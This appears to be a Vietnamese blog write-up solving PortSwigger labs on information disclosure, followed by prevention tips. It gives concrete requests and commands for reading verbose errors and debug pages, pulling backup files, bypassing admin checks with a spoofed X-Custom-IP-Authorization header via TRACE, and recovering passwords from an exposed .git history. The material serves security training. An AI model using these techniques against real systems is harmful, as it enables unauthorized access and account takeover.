---
title: "[PortSwigger Lab] - Information Disclosure Vulnerabilities"
description: Solution of Information Disclosure Vulnerabilities Lab
date: 2025-06-12 20:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, information disclosure]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-12-portswigger-lab-information-disclosure-vulnerabilities/information-disclosure-vulnerabilities.png
    alt: Information Disclosure Vulnerabilities
---

## Introduction
---
### **Information Disclosure Vulnerabilities**
- **Information Disclosure Vulnerabilities** hay còn gọi là **information leakage**, là khi một website vô tình tiết lộ thông tin nhạy cảm cho người dùng — thường là không có chủ đích.

### How do information disclosure vulnerabilities arise?
1. Không loại bỏ nội dung nội bộ khỏi nội dung công khai
    - Lập trình viên để lại **comment** trong **HTML** như:

    ```html
    <!-- TODO: remove debug endpoint /debug-info before release -->
    ```
    - Dữ liệu test hoặc file ẩn bị lộ trong môi trường **production**.

2. Cấu hình bảo mật không đúng hoặc không đầy đủ
    - Không tắt chế độ **debug**, khiến **hacker** thấy thông tin như **stack trace**, phiên bản **framework**, v.v.
    - Cấu hình mặc định **(default config)** tiết lộ thông tin kỹ thuật như cấu trúc thư mục, lỗi **SQL**, **file .env**, v.v.
    - **Web server** trả về lỗi chi tiết **(verbose error)**, giúp kẻ tấn công suy đoán cấu trúc **backend**.

3. Thiết kế và hành vi ứng dụng có sai sót
    - Ứng dụng trả về lỗi khác nhau với tài khoản đúng và sai, giúp kẻ tấn công **brute-force username/email**:
    - Phản hồi HTTP 200/403/404 khác nhau tùy vào trạng thái tài nguyên (giúp dò đoán đường dẫn, file, ID...).

## Solve Information Disclosure Vulnerabilities Lab
---
### Lab: Information disclosure in error messages
- Truy cập 1 **product page** bất kỳ
- Thay đổi `product id` thành dạng **string** => Ứng dụng hiển thị lỗi kèm **version** của **framework**

Request
```
https://0a0b00f20356c863832f52f200930024.web-security-academy.net/product?productId=xnxx
```

Response
```
Internal Server Error: java.lang.NumberFormatException: For input string: "xnxx"
...

Apache Struts 2 2.3.31
```
- Copy và Submit

### Lab: Information disclosure on debug page
- Truy cập trang web và **inspect source**
- Tìm từ khóa `debug` ở phần **source** 
- **Enter** cho đến khi thấy

```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```
- Truy cập đến `/cgi-bin/phpinfo.php` 
- Lấy `SECRET_KEY` và **submit**

### Lab: Source code disclosure via backup files

| Kiểu backup phổ biến                 | Ví dụ tên file                   |
| ------------------------------------ | -------------------------------- |
| Thêm dấu `~` vào cuối                | `index.php~`                     |
| Đổi đuôi sang `.bak`, `.old`, `.tmp` | `index.php.bak`, `config.js.old` |

- Truy cập `/robots.txt` là file hướng dẫn **google bot** tài nguyên nào được phép **index**
- Quan sát ta thấy đường dẫn đến `/backup`

```html
User-agent: *
Disallow: /backup
```
- Truy cập trang `/backup` và đọc mã nguồn của file bên trong nó

```java
ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "ha2e7u15efm2hbyxnub5ype2d16n73sp"
        ).withAutoCommit();
```
- Lấy password và submit

### Lab: Authentication bypass via information disclosure
- Truy cập trang web và gửi request đến **Burp Repeater**
- Thay đổi **method** thành `TRACE` và gửi lại request
    - TRACE là một phương thức chẩn đoán **(diagnostic)** trong **HTTP**.
    - Khi bạn gửi một yêu cầu `TRACE` tới máy chủ, nó sẽ phản hồi lại chính xác nội dung của yêu cầu bạn đã gửi.

```http
TRACE / HTTP/2
Host: 0a6d006f049637c98050a85a008c001e.web-security-academy.net
```
- Quan sát **response** có chứa trường `X-Custom-IP-Authorization: 118.69.31.247`
- Đây không phải là **header** tiêu chuẩn của **HTTP** mà là **custom header**
- Ứng dụng có thể đã sử dụng trường này để cho phép hoặc từ chối truy cập nếu địa chỉ **IP** được xác định là `"được phép"`
- Thay đổi request đến `/admin` và thêm trường này với **IP** là `127.0.0.1`

```http
TRACE /admin HTTP/2
Host: 0a6d006f049637c98050a85a008c001e.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```
- Gửi lại **request**
- Quan sát **response** chứa đường dẫn để xóa user `carlos`
- Gửi tiếp request để xóa user `carlos`

```http
TRACE /admin/delete?username=carlos HTTP/2
Host: 0a6d006f049637c98050a85a008c001e.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```
- Ứng dụng sẽ xác nhận rằng request đến từ `127.0.0.1` là request cục bộ, nhầm lẫn là admin nên cho phép truy cập tài nguyên trang **admin**

### Lab: Information disclosure in version control history
- Truy cập đến `/.git` => Lỗi cấu hình => Lộ file `.git`
- Tài file `.git` đó về

```zsh
wget -r https://0a41004e04a009548185fcda0083004e.web-security-academy.net/.git
```

#### **Idea 1:** Using **git** command
- Truy câp đến thư mục `.git` **(chưa có "git" thì lo mà tải đi nhá)**
- Xem **log** của **repository**

```zsh
git log
```

```
commit f5ebf4a50140e3538a518029f7c9f6ab8318c201 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 0591a2262f16349fbc79f83e1588f13877d6afbd
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

- Ta thấy **commit** có id `f5ebf4a50140e3538a518029f7c9f6ab8318c201` đã 
`Remove admin password from config` => Ta có thể xem sự thay đổi tại commit này để xem **password** bị xóa là gì

```zsh
git show f5ebf4a50140e3538a518029f7c9f6ab8318c201
```

```
commit f5ebf4a50140e3538a518029f7c9f6ab8318c201 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index ee7c7c9..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=d0udappaq6625y2dwbi8
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

- Author đã xóa `ADMIN_PASSWORD=d0udappaq6625y2dwbi8` và thay bằng `ADMIN_PASSWORD=env('ADMIN_PASSWORD')`
- Đăng nhập bằng tài khoản **admin** với **password** vừa tìm được
- Xóa uses `carlos`

#### **Idea 2:** Using **Git Cola**
-[**Git Cola**](https://git-cola.github.io/downloads.html) Là một ứng dụng **GUI** mã nguồn mở giúp bạn sử dụng Git mà không cần dùng dòng lệnh **(terminal)**.
- Khởi động **Git Cola**
- Chọn thư mục chứa `.git` cần xem
- Click vào `admin.conf`, chọn **Commit Tab** > **Undo Last Commit**
- Click vào `admin.conf` để xem `password`

```
deleted file mode 100644
@@ -1 +0,0 @@
-ADMIN_PASSWORD=d0udappaq6625y2dwbi8
```


## Prevent
---
1. Xác định rõ thông tin nào là "nhạy cảm"
2. Kiểm tra mã nguồn để phát hiện rò rỉ thông tin
3. Sử dụng thông báo lỗi chung chung
4. Tắt tính năng debug, test và logging nhạy cảm ở production
5. Cấu hình kỹ lưỡng các công nghệ bên thứ ba

---
Goodluck! 🍀🍀🍀 